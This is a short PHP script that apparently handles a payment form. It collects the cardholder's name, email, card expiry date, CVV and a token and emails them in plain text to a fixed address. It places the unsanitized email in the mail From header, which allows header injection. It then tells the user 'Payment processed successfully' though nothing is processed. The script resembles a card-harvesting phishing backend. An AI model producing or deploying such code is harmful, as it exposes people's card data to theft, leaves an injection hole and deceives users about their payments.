<?php
// Get form data
$name = $_POST['name'];
$email = $_POST['email'];
$expiryDate = $_POST['expiry-date'];
$cvv = $_POST['cvv'];
$token = $_POST['token'];

// Send email to register
$to = 'register@example.com';
$subject = 'New Payment';
$message = "Name: $name\nEmail: $email\nExpiry Date: $expiryDate\nCVV: $cvv\nToken: $token";
$headers = "From: $email";
mail($to, $subject, $message, $headers);

// Payment response
http_response_code(200);
echo 'Payment processed successfully.';
?>
